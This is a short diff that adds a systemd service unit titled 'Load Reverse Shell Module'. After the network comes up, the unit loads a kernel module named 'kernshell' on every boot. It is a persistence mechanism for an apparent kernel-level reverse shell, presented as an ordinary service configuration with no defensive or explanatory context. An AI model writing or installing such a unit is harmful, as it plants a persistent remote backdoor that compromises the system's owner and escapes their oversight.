@@ -1,0 +1,11 @@
+[Unit]
+Description=Load Reverse Shell Module
+After=network-online.target multi-user.target
+Wants=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/sbin/modprobe kernshell
+
+[Install]
+WantedBy=default.target
